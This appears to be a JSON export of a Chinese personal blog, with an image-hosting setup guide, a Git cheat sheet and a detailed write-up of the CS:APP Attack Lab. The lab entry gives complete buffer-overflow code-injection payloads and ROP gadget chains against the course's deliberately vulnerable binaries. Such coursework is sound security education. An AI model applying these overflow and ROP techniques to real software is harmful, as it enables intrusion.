[{"content":"运行环境 win10\nversion 0. 9. 98 (beta)★website★@typora\npicgo-2.2.2\n1.去官网下载最新的typora和picgo，并安装 2.配置typora 2.配置picgo 修改端口\n安装插件\n配置Chevereto\n注意仔细核对url\n\u0026#34;url\u0026#34;: \u0026#34;https://个人服务器Cheverto图床域名或地址/api/1/upload\u0026#34; 记得打开时间戳重命名，Chevereto不允许上传同名图片，不然会出现以下错误。\n我测试时\npicgo的时间戳不会重命名typora的验证图片时的测试图片，所以会出现第一次验证成功，之后失败的情况。\n实际功能正常。\n踩坑与调试 1.为什么原来的URL不行\n可以说得按照官方文档来，乱填url当然不行，感觉这样的回答太牵强。\n我推测是图像界面面向用户上传图片的调用方法 和 为PicGo这类用于快速上传图片并获取图片 URL 链接的工具的接口不一样。后者至少比前者多一个获取图片 URL 链接的返回数据。如果用前者的url那typora就收不到图片的链接，功能会无法实现\n2.为什么现在这个URL可以\n按照chevereto官方文档的说明（https://v3-docs.chevereto.com/API/V1.html#api-call）\n我们最好采用“POST”的形式来传数据。默认的上传url为： https://mysite.com/api/1/upload\n为什么锁定是url的问题？\n假设Typora + PicGo+ Chevereto这三个软件及插件都没问题，key也没问题。\nPicGo的本质还是收发数据包吧，我没有去看源码，但感觉和web端的通信是通过给url传不同的参数来实现。\n要么传的参数有问题，要么url有问题，逐个排查也可。参数大概是软件设置的选项，然后我也一直在调，常见的问题都搜过了，小概率是问题太偏。但url真的很可疑呀，我填的时候没有想太多，就理所当然地复制了。连文档都没查，参考的博客看得也不仔细。\n","permalink":"https://inten.kro1lsec.com/post/typora-+-picgo+-chevereto/","summary":"运行环境 win10\nversion 0. 9. 98 (beta)★website★@typora\npicgo-2.2.2\n1.去官网下载最新的typora和picgo，并安装 2.配置typora 2.配置picgo 修改端口\n安装插件\n配置Chevereto\n注意仔细核对url\n\u0026#34;url\u0026#34;: \u0026#34;https://个人服务器Cheverto图床域名或地址/api/1/upload\u0026#34; 记得打开时间戳重命名，Chevereto不允许上传同名图片，不然会出现以下错误。\n我测试时\npicgo的时间戳不会重命名typora的验证图片时的测试图片，所以会出现第一次验证成功，之后失败的情况。\n实际功能正常。\n踩坑与调试 1.为什么原来的URL不行\n可以说得按照官方文档来，乱填url当然不行，感觉这样的回答太牵强。\n我推测是图像界面面向用户上传图片的调用方法 和 为PicGo这类用于快速上传图片并获取图片 URL 链接的工具的接口不一样。后者至少比前者多一个获取图片 URL 链接的返回数据。如果用前者的url那typora就收不到图片的链接，功能会无法实现\n2.为什么现在这个URL可以\n按照chevereto官方文档的说明（https://v3-docs.chevereto.com/API/V1.html#api-call）\n我们最好采用“POST”的形式来传数据。默认的上传url为： https://mysite.com/api/1/upload\n为什么锁定是url的问题？\n假设Typora + PicGo+ Chevereto这三个软件及插件都没问题，key也没问题。\nPicGo的本质还是收发数据包吧，我没有去看源码，但感觉和web端的通信是通过给url传不同的参数来实现。\n要么传的参数有问题，要么url有问题，逐个排查也可。参数大概是软件设置的选项，然后我也一直在调，常见的问题都搜过了，小概率是问题太偏。但url真的很可疑呀，我填的时候没有想太多，就理所当然地复制了。连文档都没查，参考的博客看得也不仔细。","title":"Typora + PicGo+ Chevereto踩坑指南"},{"content":"","permalink":"https://inten.kro1lsec.com/about/","summary":"","title":"About"},{"content":"Git基本操作 初次使用需要配置好邮箱用户名，ssh或token\nhttps://docs.github.com/cn/github/getting-started-with-github/quickstart\n大致流程 1.链接\n2.增删改查\n3.提交更改\n4.提交分支\necho \u0026#34;# KroCTF\u0026#34; \u0026gt;\u0026gt; README.md git init git add README.md git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin https://github.com/1nten/KroCTF.git git push -u origin main 配置 $ git config --global user.email \u0026#34;email@example.com\u0026#34; $ git config --global user.name \u0026#34;Mona Lisa\u0026#34; $ git config --global user.name $ git config --global user.email 基础信息 //显示工作目录和暂存区的状态 $ git status //显示日志（项目历史的信息） $ git log //将分支new1同步到云端GitHub $ git push origin new1 //克隆 $ git clone https://github.com/1nten/codeql.git //初始化 $ git init 链接 //创建链接origin $ git remote add origin https://github.com/1nten/test1.git //删除链接origin $ git remote rm origin 分支 //创建分支new1 $ git branch new1 //切换分支new1 $ git checkout new1 //删除本地分支new1 $ git branch --delete new1 //删除远程分支new1 $ git push origin --delete new1 //合并分支 61445@Social MINGW64 ~/Desktop/github (new1) $ git checkout main Switched to branch \u0026#39;main\u0026#39; 61445@Social MINGW64 ~/Desktop/github (main) $ git merge new1 Updating 94b56ea..ee28bef Fast-forward test.md | 1 + test.txt | 1 - 2 files changed, 1 insertion(+), 1 deletion(-) create mode 100644 test.md delete mode 100644 test.txt 文件 //创建文件test.md $ echo \u0026#34;## hello git\u0026#34; \u0026gt;\u0026gt; test.md //添加文件test.md $ git add test.md //提交更改文件test.md $ git commit -m \u0026#34;这是个测试文件\u0026#34; test.md //将分支new1同步到云端GitHub $ git push origin new1 //删除文件test.txt $ git rm test.txt //提交更改文件test.txt $ git commit -m \u0026#34;这是个测试文件\u0026#34; test.txt //将分支new1同步到云端GitHub $ git push origin new1 调试信息 参考链接 https://zhuanlan.zhihu.com/p/88246764\nhttps://docs.github.com/cn/github/getting-started-with-github/quickstart\nhttps://training.github.com/downloads/zh_CN/github-git-cheat-sheet/\n","permalink":"https://inten.kro1lsec.com/post/githubup/","summary":"Git基本操作 初次使用需要配置好邮箱用户名，ssh或token\nhttps://docs.github.com/cn/github/getting-started-with-github/quickstart\n大致流程 1.链接\n2.增删改查\n3.提交更改\n4.提交分支\necho \u0026#34;# KroCTF\u0026#34; \u0026gt;\u0026gt; README.md git init git add README.md git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin https://github.com/1nten/KroCTF.git git push -u origin main 配置 $ git config --global user.email \u0026#34;email@example.com\u0026#34; $ git config --global user.name \u0026#34;Mona Lisa\u0026#34; $ git config --global user.name $ git config --global user.email 基础信息 //显示工作目录和暂存区的状态 $ git status //显示日志（项目历史的信息） $ git log //将分支new1同步到云端GitHub $ git push origin new1 //克隆 $ git clone https://github.","title":"Github初入"},{"content":"ctarget 首先执行getbuf函数，读取标准输入。\nunsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现\nFAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。\n1.1level 1 观察test，getbuf和touch1\n目的：将getbuf的返回地址由test改为touch1\n小建议\n 利用objdump -d ./ctarget\u0026gt;\u0026gt;ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。\n(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 \u0026#34;No exploit. Getbuf returned 0x%x\\n\u0026#34; stack : padding(00..) + touch1(0x4017c0)\n攻击序列touch1.txt\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.txt里，并通过hex2raw转换为字符串。并执行程序。\n./hex2raw \u0026lt;touch1.txt\u0026gt;2.txt ./ctarget -qi 2.txt 1.2level 2 要求：要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie\n小建议\n touch2的参数val是利用rdi寄存器进行传递的 你要利用某种方式让getbuf的返回地址为touch2的地址 你的注入代码的传入参数应该等于cookie的值。 不要在注入代码内调用ret或者call 请参见附录B中有关如何使用工具生成字节级表示形式的指令序列的讨论。  touch2的代码如下\nvoid touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(\u0026#34;Touch2!: You called touch2(0x%.8x)\\n\u0026#34;, val); validate(2); } else { printf(\u0026#34;Misfire: You called touch2(0x%.8x)\\n\u0026#34;, val); fail(2); } exit(0); } 逻辑：比较我们传入的参数val是否等于cookie的值，如果等于就可以通过。\n本题的关键就是在改变返回地址前也设置rdi寄存器的值。\n插入的汇编代码\nmovq $0x59b997fa, %rdi pushq $0x4017ec ret 查看他的字节序表示\nAttack Lab$ vim l2.s Attack Lab$ gcc -c l2.s Attack Lab$ objdump -d l2.o l2.o： 文件格式 elf64-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0:\t48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7:\t68 ec 17 40 00 pushq $0x4017ec c:\tc3 retq stack : padding(00..) + pop_rdi(0x40141b) + arg1(cookies) + touch2(0x4017ec)\n48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 Attack Lab$ ./hex2raw \u0026lt;touch2.txt\u0026gt;2.txt Attack Lab$ ./ctarget -qi 2.txt 1.3level 3 hexmatch和touch3的代码如下。\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \u0026#34;%.8x\u0026#34;, val); //s=val=cookie  return strncmp(sval, s, 9) == 0; //比较cookie和第二个参数的前9位是否相同  // cookie只有8字节。这里为9的原因是我们要比较最后一个是否为\u0026#39;\\0\u0026#39;  } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { //相同则成功  printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } 任务: 你的任务getbuf之后执行touch3而不是继续执行test。你必须要传递cookie字符串作为参数。每次运行时，堆栈中的地址保持不变，并在堆栈中存储一个字符串。\n小建议\n 你需要在利用缓冲区溢出的字符串中包含cookie的字符串表示形式。该字符串应该有8个十六进制数组成。注意没有前导0x 注意在c语言中的字符串表示会在末尾处加一个\\0 您注入的代码应将寄存器％rdi设置为此字符串的地址 调用函数hexmatch和strncmp时，它们会将数据压入堆栈，从而覆盖存放getbuf使用的缓冲区的内存部分。 因此，您需要注意在哪里放置您的Cookie字符串  字符串必须放在ret地址后面，因为后面函数执行时(在hexmatch函数里,向系统请求了100字节的空间，使可能覆盖变为铁定会覆盖)，会覆盖掉字符串。 而hexmatch比较的是字符串，所以cookie还要转换成字符串(用16进制表示)\n简单分析touch3\n00000000004018fa \u0026lt;touch3\u0026gt;: 4018fa: 53 push %rbx 4018fb: 48 89 fb mov %rdi,%rbx 4018fe: c7 05 d4 2b 20 00 03 movl $0x3,0x202bd4(%rip) # 6044dc \u0026lt;vlevel\u0026gt; 401905: 00 00 00 401908: 48 89 fe mov %rdi,%rsi 40190b: 8b 3d d3 2b 20 00 mov 0x202bd3(%rip),%edi # 6044e4 \u0026lt;cookie\u0026gt; 401911: e8 36 ff ff ff callq 40184c \u0026lt;hexmatch\u0026gt; 401916: 85 c0 test %eax,%eax 逻辑非常简单首先把rdi的值传递给rsi然后把cookie的值传递给rdi调用hexmatch函数。这里rsi的值应该就是我们的字符串数组的起始地址。\n这里我们注意hexmatch函数里也开辟了栈帧。并且还有随机栈偏移动。可以说字符串s的地址我们是没法估计 的。并且提示中告诉了我们hexmatch和strncmp函数可能会覆盖我们getbuf的缓冲区。所以我们的注入代码要放在一个安全的位置。我们可以把它放到text的栈帧中。我们在getbuf分配栈帧之前打一个断点。\nb *0x4017a8 (gdb) b *0x4017a8 Breakpoint 1 at 0x4017a8: file buf.c, line 12. (gdb) r -q #gdb调试时传参数放在里面 Starting program: /csapp/attack/ctarget -q warning: Error disabling address space randomization: Operation not permitted Missing separate debuginfos, use: yum debuginfo-install glibc-2.28-127.el8.x86_64 Cookie: 0x59b997fa Breakpoint 1, getbuf () at buf.c:12 12 buf.c: No such file or directory. (gdb) info r rsp rsp 0x5561dca0 0x5561dca0 stack : padding(00..) + pop_rdi(0x40141b) + arg1(stack_str) + touch3(0x4018fa) + stack_str(str(cookies))\n48 c7 c7 a8 dc 61 55 68 \u0026lt;-读入我们要执行的汇编语句\rfa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00\r00 00 00 00 00 00 00 00\r00 00 00 00 00 00 00 00\r78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 \u0026lt;-返回地址为rsp Attack Lab$ ./hex2raw \u0026lt;touch3.txt\u0026gt;3.txt Attack Lab$ ./ctarget -qi 3.txt 2.1level 4 思考： 首先要把cookie传入%rdi，然后再转入到touch2函数。\n根据readme.pdf的命令列表，在gadets farm中没有发现popq %rdi。于是可以先popq %rax，然后movq %rax, %rdi\n这里的缓冲区完全被junk填充，然后从getbuf的ret向下执行。用到了两个gadget，所用到的data也放在了栈上。\n方法一\nAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rcc 19 40 00 00 00 00 00 /* jump 0x4019cc; popq %rax */\rfa 97 b9 59 00 00 00 00 /* cookie */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5; movq %rax, %rdi */\rec 17 40 00 00 00 00 00 /* touch2 */\r方法二\n@le2.txt 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 2b 40 00 00 00 00 00 #pop %rdi fa 97 b9 59 00 00 00 00 #cookie ec 17 40 00 00 00 00 00 #touch2 ./hex2raw \u0026lt; le2.txt | ./rtarget -q 2.2level 5 肝不动了，参考别人的。\n思考：\n同Phase 5一样，这里也需要考虑如何存放cookie字符串，并且多了一个传递字符串地址到%rdi的难题。\n首先，getbuf的缓冲区应该全部填充为junk，那么cookie字符串为了不干扰exploit的正常运行，必然要放在exploit的最后。\n第二个问题，一开始在gadgets farm找到许多如下的操作：\nmov $0x909078fb,%eax lea -0x3c3876b8(%rdi),%eax movl $0xc7c78948,(%rdi) \u0026hellip;\u0026hellip; 所以考虑过能否使用这些数值来拼凑一个地址，然后把cookie字符串放在那里。但是由于有栈随机化，所以这个思路不行。\n后来看了一些解答，发现居然有movq %rsp, %rax这样的神操作，那样就可以用(%rsp) + x的方式来得到cookie字符串的地址了。然后就是一通拼拼凑凑，用了8个gadgets完成了exploit。\nexploit-5 关于这种需要很多gadgets才能完成的exploit，觉得思路肯定是最重要的，但是思路明晰之后，在组成gadgets的链条时，不妨用倒序查找的方法，也许会快一些。当然，今后肯定会使用一些查找gadgets的工具啦。\nAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\r06 1a 40 00 00 00 00 00 /* jump 0x401a06 ;movq %rsp, %rax */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5 ;movq %rax, %rdi */\rab 19 40 00 00 00 00 00 /* jump 0x4019ab ;popq %rax */\r48 00 00 00 00 00 00 00 /* distance from here to cookie string */\rdd 19 40 00 00 00 00 00 /* jump 0x4019dd ;movl %eax, %edx */\r34 1a 40 00 00 00 00 00 /* jump 0x401a34 ;movl %edx, %ecx */\r13 1a 40 00 00 00 00 00 /* jump 0x401a13 ;movl %ecx, %esi */\rd6 19 40 00 00 00 00 00 /* jump 0x4019d6 ;lea (%rdi,%rsi,1),%rax */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5 ;movq %rax, %rdi */\rfa 18 40 00 00 00 00 00 /* touch3 */\r35 39 62 39 39 37 66 61 /* cookie string */\r00 00 00 00 00 00 00 00 /* string ends with 00 */\r","permalink":"https://inten.kro1lsec.com/post/attack-lab/","summary":"ctarget 首先执行getbuf函数，读取标准输入。\nunsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现\nFAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。\n1.1level 1 观察test，getbuf和touch1\n目的：将getbuf的返回地址由test改为touch1\n小建议\n 利用objdump -d ./ctarget\u0026gt;\u0026gt;ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。\n(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 \u0026#34;No exploit. Getbuf returned 0x%x\\n\u0026#34; stack : padding(00..) + touch1(0x4017c0)\n攻击序列touch1.txt\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.","title":"[CSAPPLAB]Attack Lab"}]